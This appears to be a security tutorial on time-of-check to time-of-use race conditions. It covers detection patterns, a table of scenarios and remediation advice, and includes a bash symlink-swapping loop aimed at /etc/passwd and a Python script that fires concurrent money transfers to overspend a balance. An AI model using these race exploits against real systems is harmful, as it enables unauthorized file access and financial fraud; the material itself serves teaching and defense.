# Time-Based Races — TOCTOU Exploitation

## Summary
Time-of-Check to Time-of-Use (TOCTOU) vulnerabilities occur when a resource is checked and then used, with a window between the two operations that an attacker can exploit.

## Detection

### Step 1: Find TOCTOU Patterns
Look for code patterns that:
1. Check a condition (file exists, balance sufficient, user authorised)
2. Perform an action based on that check
3. Do NOT lock the resource between check and action

### Step 2: Common TOCTOU Scenarios

| Scenario | Check | Use | Race |
|----------|-------|-----|------|
| File upload | Check filename is unique | Move temp file to final path | Symlink race |
| Bank transfer | Check balance >= amount | Debit balance | Overdraft |
| Username registration | Check username available | INSERT user record | Duplicate registration |
| File deletion | Check user owns file | Delete file | Delete another user's file |

### Step 3: Exploit File-Based TOCTOU

```bash
# Monitor for race window on file operations
while true; do
  ln -sf /etc/passwd /tmp/target_upload.txt &
  ln -sf /tmp/safe_file.txt /tmp/target_upload.txt &
done
```

### Step 4: Exploit Financial TOCTOU

```python
import requests
from concurrent.futures import ThreadPoolExecutor

# Race two transfers from the same account simultaneously
url = "https://target.com/api/transfer"
cookies = {"session": "abc123"}

def transfer(amount):
    r = requests.post(url, cookies=cookies, json={
        "to": "attacker_account",
        "amount": amount
    })
    return r.status_code

# Try to spend more than the balance simultaneously
with ThreadPoolExecutor(max_workers=5) as pool:
    # Each transfer attempts to move 100 units
    # If balance is 100, two concurrent 100 transfers might both pass
    futures = [pool.submit(transfer, 100) for _ in range(5)]
    results = [f.result() for f in futures]
    successes = sum(1 for s in results if s == 200)
    print(f"Successful transfers: {successes}")
```

## Remediation
- Use atomic operations: `UPDATE accounts SET balance = balance - ? WHERE balance >= ?`
- Implement optimistic locking with version numbers
- Use filesystem operations atomically (renameat2, O_CREAT | O_EXCL)
- Apply advisory or mandatory file locking (flock, lockf)
